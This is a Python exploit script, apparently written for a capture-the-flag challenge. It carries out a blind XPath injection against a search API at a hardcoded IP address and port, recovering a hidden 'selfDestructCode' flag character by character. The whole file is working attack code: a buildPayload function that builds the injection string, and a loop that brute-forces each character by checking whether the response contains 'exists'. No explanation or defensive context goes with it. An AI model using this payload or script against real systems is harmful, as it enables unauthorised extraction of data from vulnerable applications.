#!/usr/bin/env python3
import requests
import string
import json
import signal
import sys

## NOTE: flag is in two parts, will need to modify payload for each part
## district position 2, staff position 3
## district position 3, staff position 2

url = 'http://188.166.172.13:31841/api/search'
alpha = '{}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$%^&*()[]@:;#<>,.!~'

class colour:
   GREEN = '\033[1;32;48m'
   RED = '\033[0;31;48m'
   END = '\033[1;37;0m'

def signal_handler(sig, frame):
    print('\033[?25h', end = '\r')
    print('Injection canceled!')
    sys.exit(0)

def buildPayload(n, c):
    return f"'or substring(//district[position()=2]/staff[position()=3]/selfDestructCode,{n},1)='{c}' and ''='"

def makeReq(payload):
    data = {
            "search":f"{payload}"
            }
    headers = {
            'Content-Type': 'application/json'
            }

    json_d = json.dumps(data)
    r = requests.post(url, data=json_d, headers=headers)
    return r.text

signal.signal(signal.SIGINT, signal_handler)
chars_exhausted = False
i = 1
flag = ''
print('\033[?25l', end = '\r')
while not chars_exhausted:
    for c in alpha:
        print(f'{colour.GREEN}{flag}{colour.END}{colour.RED}{c}{colour.END}', end = '\r')
        if 'exists' in makeReq(buildPayload(i,c)):
            flag += c
            i += 1
            break
        elif c == '~':
            print('')
            chars_exhausted = True
    
print('\033[?25h', end = '\r')
print(flag)
